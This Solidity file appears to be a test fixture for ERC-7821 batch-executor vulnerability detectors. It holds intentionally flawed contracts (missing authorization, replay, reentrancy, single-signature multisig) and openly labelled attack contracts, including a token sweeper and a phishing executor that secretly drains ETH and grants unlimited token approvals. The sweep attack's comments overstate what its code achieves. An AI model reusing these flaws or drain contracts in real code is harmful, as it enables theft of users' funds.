// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title BatchAuthorizationVulnerable
 * @notice ERC-7821 Minimal Batch Executor Vulnerabilities
 *
 * VULNERABILITY: Batch execution authorization bypass
 * ERC: ERC-7821 (Minimal Batch Executor, 2024)
 *
 * BACKGROUND:
 * ERC-7821 defines a standard interface for batch executing multiple calls
 * in a single transaction. While gas-efficient, it introduces authorization
 * and security risks if not implemented carefully.
 *
 * SPECIFICATION (ERC-7821):
 * ```solidity
 * interface IERC7821 {
 *     struct Call {
 *         address target;
 *         uint256 value;
 *         bytes data;
 *     }
 *     function execute(Call[] calldata calls) external payable;
 * }
 * ```
 *
 * SECURITY RISKS:
 * 1. Authorization bypass (no per-call auth check)
 * 2. Token approval exploitation
 * 3. Replay attacks (no nonce system)
 * 4. msg.sender validation issues
 * 5. Reentrancy in batch context
 *
 * TESTED DETECTORS:
 * - erc7821-batch-authorization
 * - erc7821-token-approval
 * - erc7821-replay-protection
 * - erc7821-msg-sender-validation
 */

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

/**
 * @title VulnerableBatchExecutor
 * @notice ERC-7821 implementation with multiple vulnerabilities
 */
contract VulnerableBatchExecutor {
    struct Call {
        address target;
        uint256 value;
        bytes data;
    }

    event BatchExecuted(address indexed executor, uint256 callCount);
    event CallExecuted(address indexed target, uint256 value, bool success);

    /**
     * @notice VULNERABILITY 1: No per-call authorization
     * @dev Anyone can batch execute calls, including privileged operations
     *
     * ATTACK: Attacker can batch execute:
     * - Token approvals to themselves
     * - Transfers from approved accounts
     * - Admin operations if any are exposed
     */
    function execute(Call[] calldata calls) external payable {
        for (uint256 i = 0; i < calls.length; i++) {
            // VULNERABLE: No authorization check per call
            // msg.sender is the same for all calls in batch
            (bool success, ) = calls[i].target.call{value: calls[i].value}(calls[i].data);

            emit CallExecuted(calls[i].target, calls[i].value, success);
        }

        emit BatchExecuted(msg.sender, calls.length);
    }

    /**
     * @notice VULNERABILITY 2: Token approval within batch
     * @dev Batch can include approval + transferFrom in same transaction
     *
     * ATTACK SCENARIO:
     * Call 1: approve(attacker, MAX)
     * Call 2: transferFrom(victim, attacker, balance)
     * Result: Attacker drains victim's tokens
     */
    function executeWithApproval(
        address token,
        address spender,
        uint256 amount,
        Call[] calldata additionalCalls
    ) external {
        // VULNERABLE: Approval in batch context is dangerous
        IERC20(token).approve(spender, amount);

        // Execute additional calls (could include transferFrom!)
        for (uint256 i = 0; i < additionalCalls.length; i++) {
            (bool success, ) = additionalCalls[i].target.call{value: additionalCalls[i].value}(
                additionalCalls[i].data
            );
            require(success, "Call failed");
        }
    }

    /**
     * @notice VULNERABILITY 3: No replay protection
     * @dev Same batch can be executed multiple times
     */
    function executeSigned(
        Call[] calldata calls,
        bytes calldata signature
    ) external payable {
        // VULNERABLE: No nonce system
        // Same signature can be replayed infinitely

        bytes32 hash = keccak256(abi.encode(calls));
        address signer = recoverSigner(hash, signature);

        // Minimal validation
        require(signer != address(0), "Invalid signature");

        // Execute batch
        for (uint256 i = 0; i < calls.length; i++) {
            (bool success, ) = calls[i].target.call{value: calls[i].value}(calls[i].data);
            emit CallExecuted(calls[i].target, calls[i].value, success);
        }
    }

    /**
     * @notice VULNERABILITY 4: msg.sender confusion
     * @dev Called contracts see BatchExecutor as msg.sender, not original caller
     */
    function executeOnBehalf(
        address user,
        Call[] calldata calls
    ) external {
        // VULNERABLE: Contracts in batch see msg.sender = this contract
        // Not the original user!

        for (uint256 i = 0; i < calls.length; i++) {
            // msg.sender in target contract = address(this)
            // NOT = user!
            (bool success, ) = calls[i].target.call{value: calls[i].value}(calls[i].data);
            require(success, "Call failed");
        }
    }

    function recoverSigner(bytes32 hash, bytes memory signature) internal pure returns (address) {
        if (signature.length != 65) return address(0);

        bytes32 r;
        bytes32 s;
        uint8 v;

        assembly {
            r := mload(add(signature, 32))
            s := mload(add(signature, 64))
            v := byte(0, mload(add(signature, 96)))
        }

        if (v < 27) v += 27;
        if (v != 27 && v != 28) return address(0);

        return ecrecover(hash, v, r, s);
    }

    receive() external payable {}
}

/**
 * @title TokenSweeperViaBatch
 * @notice Exploits ERC-7821 batch executor to sweep tokens
 */
contract TokenSweeperViaBatch {
    VulnerableBatchExecutor public batchExecutor;

    constructor(address _batchExecutor) {
        batchExecutor = VulnerableBatchExecutor(_batchExecutor);
    }

    /**
     * @notice ATTACK: Sweep tokens using batch executor
     * @dev Combines approval and transfer in single batch
     */
    function sweepTokens(
        address token,
        address victim,
        address attacker
    ) external {
        VulnerableBatchExecutor.Call[] memory calls = new VulnerableBatchExecutor.Call[](2);

        // Call 1: Approve attacker for victim's tokens
        calls[0] = VulnerableBatchExecutor.Call({
            target: token,
            value: 0,
            data: abi.encodeWithSelector(
                IERC20.approve.selector,
                attacker,
                type(uint256).max
            )
        });

        // Call 2: Transfer tokens from victim to attacker
        uint256 balance = IERC20(token).balanceOf(victim);
        calls[1] = VulnerableBatchExecutor.Call({
            target: token,
            value: 0,
            data: abi.encodeWithSelector(
                IERC20.transferFrom.selector,
                victim,
                attacker,
                balance
            )
        });

        // Execute malicious batch
        batchExecutor.execute(calls);
    }
}

/**
 * @title PhishingBatchContract
 * @notice Phishing contract disguised as helpful batch executor
 */
contract PhishingBatchContract {
    struct Call {
        address target;
        uint256 value;
        bytes data;
    }

    address public immutable attacker;

    constructor(address _attacker) {
        attacker = _attacker;
    }

    /**
     * @notice PHISHING: Advertised as "gas-efficient batch executor"
     * @dev Actually includes hidden call to drain funds
     *
     * USER THINKS: "I'm just batching my DeFi operations"
     * REALITY: Batch includes hidden drain transaction
     */
    function executeBatch(Call[] calldata userCalls) external payable {
        // Execute user's legitimate calls
        for (uint256 i = 0; i < userCalls.length; i++) {
            (bool success, ) = userCalls[i].target.call{value: userCalls[i].value}(
                userCalls[i].data
            );
            require(success, "Call failed");
        }

        // HIDDEN: Drain ETH to attacker
        if (address(this).balance > 0) {
            payable(attacker).transfer(address(this).balance);
        }
    }

    /**
     * @notice PHISHING: Hidden token approval
     */
    function executeBatchWithGasRefund(
        Call[] calldata userCalls,
        address token
    ) external payable {
        // HIDDEN: Approve attacker for all tokens
        IERC20(token).approve(attacker, type(uint256).max);

        // Execute user's calls
        for (uint256 i = 0; i < userCalls.length; i++) {
            (bool success, ) = userCalls[i].target.call{value: userCalls[i].value}(
                userCalls[i].data
            );
            require(success, "Call failed");
        }
    }
}

/**
 * @title ReentrancyInBatch
 * @notice Reentrancy vulnerability in batch context
 */
contract ReentrancyInBatch {
    mapping(address => uint256) public balances;

    struct Call {
        address target;
        uint256 value;
        bytes data;
    }

    /**
     * @notice VULNERABILITY 5: Reentrancy in batch execution
     * @dev Batch can be re-entered during execution
     */
    function executeBatchWithdraw(uint256 amount, Call[] calldata additionalCalls) external {
        require(balances[msg.sender] >= amount, "Insufficient balance");

        // Execute additional calls (could include reentrancy!)
        for (uint256 i = 0; i < additionalCalls.length; i++) {
            (bool success, ) = additionalCalls[i].target.call{value: additionalCalls[i].value}(
                additionalCalls[i].data
            );
            require(success, "Call failed");
        }

        // VULNERABLE: Balance update after external calls
        balances[msg.sender] -= amount;
        payable(msg.sender).transfer(amount);
    }

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    receive() external payable {}
}

/**
 * @title MultiSigBatchExecutor
 * @notice Multi-signature batch executor with authorization issues
 */
contract MultiSigBatchExecutor {
    mapping(address => bool) public isSigner;
    mapping(bytes32 => bool) public executed;

    struct Call {
        address target;
        uint256 value;
        bytes data;
    }

    constructor(address[] memory signers) {
        for (uint256 i = 0; i < signers.length; i++) {
            isSigner[signers[i]] = true;
        }
    }

    /**
     * @notice VULNERABILITY 6: Batch execution with weak multisig
     * @dev Single signature can execute batch (should require threshold)
     */
    function executeMultiSigBatch(
        Call[] calldata calls,
        bytes calldata signature
    ) external {
        bytes32 batchHash = keccak256(abi.encode(calls));

        // VULNERABLE: Only checks one signature
        // Should require multiple signatures!
        address signer = recoverSigner(batchHash, signature);
        require(isSigner[signer], "Not a signer");

        // VULNERABLE: No replay protection
        // require(!executed[batchHash], "Already executed");
        // executed[batchHash] = true;

        for (uint256 i = 0; i < calls.length; i++) {
            (bool success, ) = calls[i].target.call{value: calls[i].value}(calls[i].data);
            require(success, "Call failed");
        }
    }

    function recoverSigner(bytes32 hash, bytes memory signature) internal pure returns (address) {
        if (signature.length != 65) return address(0);

        bytes32 r;
        bytes32 s;
        uint8 v;

        assembly {
            r := mload(add(signature, 32))
            s := mload(add(signature, 64))
            v := byte(0, mload(add(signature, 96)))
        }

        if (v < 27) v += 27;

        return ecrecover(hash, v, r, s);
    }

    receive() external payable {}
}
